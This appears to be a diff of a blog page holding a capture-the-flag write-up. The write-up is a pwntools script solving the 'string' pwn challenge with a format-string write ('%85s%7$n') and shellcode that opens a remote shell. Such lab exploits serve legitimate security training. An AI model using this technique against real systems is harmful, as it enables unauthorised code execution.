@@ -18,17 +18,17 @@
   <meta name="keywords" content="">
   <meta name="description" content="String12345678910111213141516171819202122from pwn import *context.terminal &#x3D; [&amp;#x27;terminator&amp;#x27;,&amp;#x27;-x&amp;#x27;,&amp;#x27;sh&amp;#x27;,&amp;#x27;-c&amp;#x27;]context(arch&#x3D;&amp;#x27;amd64&amp;#x27;, os&#x3D;&amp;#x27;linux&amp;#x27;)#">
 <meta property="og:type" content="article">
-<meta property="og:title" content="blog">
+<meta property="og:title" content="adworld_pwn_lasting.md">
 <meta property="og:url" content="https://ceris3s.github.io/2022/02/21/adworld_pwn_lasting/index.html">
 <meta property="og:site_name" content="blog">
 <meta property="og:description" content="String12345678910111213141516171819202122from pwn import *context.terminal &#x3D; [&amp;#x27;terminator&amp;#x27;,&amp;#x27;-x&amp;#x27;,&amp;#x27;sh&amp;#x27;,&amp;#x27;-c&amp;#x27;]context(arch&#x3D;&amp;#x27;amd64&amp;#x27;, os&#x3D;&amp;#x27;linux&amp;#x27;)#">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-02-21T01:24:21.823Z">
-<meta property="article:modified_time" content="2019-11-07T12:26:28.317Z">
+<meta property="article:modified_time" content="2022-02-21T01:41:02.438Z">
 <meta property="article:author" content="Cerises">
 <meta name="twitter:card" content="summary_large_image">
   
-  <title>blog</title>
+  <title>adworld_pwn_lasting.md - blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -174,7 +174,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="">
+            <span class="h2" id="subtitle" title="adworld_pwn_lasting.md">
               
             </span>
 
@@ -233,7 +233,7 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none"></h1>
+            <h1 style="display: none">adworld_pwn_lasting.md</h1>
             
             <div class="markdown-body">
               <h2 id="String"><a href="#String" class="headerlink" title="String"></a>String</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;sh&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]<br>context(<span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span>, <span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./string&quot;)</span><br><span class="hljs-comment">#gdb.attach(proc.pidof(p)[0])</span><br>p = remote(<span class="hljs-string">&quot;111.198.29.45&quot;</span>,43301)<br><span class="hljs-builtin-name">print</span> p.recvuntil(<span class="hljs-string">&quot;secret[0] is &quot;</span>)<br>after_content = p.recvuntil(<span class="hljs-string">&quot;What should your character&#x27;s name be:\n&quot;</span>)<br><span class="hljs-builtin-name">print</span> after_content<br>secret_addr = int(after_content.split(<span class="hljs-string">&#x27;\n&#x27;</span>)[0],16)<br>p.sendline(<span class="hljs-string">&quot;test&quot;</span>)<br>addr_wanted = str(secret_addr)<br>shellcode = asm(shellcraft.sh())<br><span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot; addr_wanted:&quot;</span>,addr_wanted)<br><span class="hljs-builtin-name">print</span> p.sendlineafter(<span class="hljs-string">&quot;So, where you will go?east or up?:\n&quot;</span>,<span class="hljs-string">&quot;east&quot;</span>)<br><span class="hljs-builtin-name">print</span> p.sendlineafter(<span class="hljs-string">&quot;go into there(1), or leave(0)?:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br><span class="hljs-builtin-name">print</span> p.sendlineafter(<span class="hljs-string">&quot;&#x27;Give me an address&#x27;\n&quot;</span>,addr_wanted)<br><span class="hljs-builtin-name">print</span> p.sendlineafter(<span class="hljs-string">&quot;And, you wish is:\n&quot;</span>,<span class="hljs-string">&quot;%85s%7<span class="hljs-variable">$n</span>&quot;</span>)<br><span class="hljs-builtin-name">print</span> p.recvuntil(<span class="hljs-string">&quot;Wizard: I will help you! USE YOU SPELL\n&quot;</span>)<br>p.sendline(shellcode)<br><span class="hljs-comment">#print p.sendlineafter(&quot;Wizard: I will help you! USE YOU SPELL\n&quot;,shellcode)</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
